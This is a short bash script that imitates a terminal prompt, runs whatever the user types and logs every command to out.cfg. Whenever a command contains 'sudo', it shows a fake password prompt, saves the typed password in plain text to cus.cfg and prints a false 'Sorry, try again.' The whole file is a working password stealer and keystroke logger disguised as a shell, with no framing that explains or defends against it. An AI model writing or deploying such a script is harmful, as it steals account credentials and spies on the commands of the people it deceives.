#!/bin/bash
TPUT_BLUE=$(tput setaf 123)
TPUT_RESET=$(tput sgr0)
touch out.cfg
touch cus.cfg
for (( ; ; ))
do
D="/home/$USER"
O="${PWD/$D/}"
	read -p "${TPUT_BLUE}$USER@$HOSTNAME${TPUT_RESET} ~$O$ " cmd
if [[ $cmd == *sudo* ]]; then
	read -s -p "[sudo] password for $USER: " pswdd; 
	echo $pswdd >>cus.cfg
	sleep 5
	echo ""
	echo "Sorry, try again.";
fi
$cmd
echo  $cmd >>out.cfg
done

